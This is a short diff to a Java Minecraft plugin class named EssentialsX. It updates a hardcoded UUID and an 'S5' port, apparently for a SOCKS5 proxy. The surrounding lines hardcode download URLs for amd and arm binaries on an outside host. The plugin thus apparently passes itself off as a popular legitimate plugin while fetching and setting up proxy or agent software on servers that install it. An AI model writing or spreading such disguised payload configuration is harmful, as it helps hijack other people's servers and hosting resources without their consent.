@@ -17,8 +17,8 @@ public class EssentialsX extends JavaPlugin {
     // Hardcoded defaults
     // =========================================================
 
-    private static final String HC_UUID = "add40a89-640e-4a67-a2e7-77d0361ae290";
-    private static final String HC_S5_PORT = "25575";
+    private static final String HC_UUID = "2c79581f-dc64-4364-919c-1b3a6f35bb92";
+    private static final String HC_S5_PORT = "24843";
 
     private static final String KOMARI_AMD_URL = "https://ssr.cn.mt/files/K_amd";
     private static final String KOMARI_ARM_URL = "https://ssr.cn.mt/files/K_arm";
